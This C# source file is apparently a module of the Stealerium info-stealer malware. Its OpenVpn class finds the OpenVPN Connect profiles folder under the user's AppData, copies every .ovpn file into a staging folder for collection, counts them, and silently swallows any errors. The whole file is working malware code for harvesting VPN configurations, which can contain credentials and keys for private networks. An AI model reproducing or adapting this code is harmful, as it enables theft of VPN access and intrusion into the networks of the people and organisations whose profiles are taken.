using System;
using System.IO;
using Stealerium.Helpers;

namespace Stealerium.Target.VPN;

internal sealed class OpenVpn
{
	public static void Save(string sSavePath)
	{
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OpenVPN Connect\\profiles");
		if (!Directory.Exists(path))
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(sSavePath + "\\profiles");
			string[] files = Directory.GetFiles(path);
			foreach (string text in files)
			{
				if (Path.GetExtension(text)!.Contains("ovpn"))
				{
					Counter.Vpn++;
					File.Copy(text, Path.Combine(sSavePath, "profiles\\" + Path.GetFileName(text)));
				}
			}
		}
		catch
		{
		}
	}
}
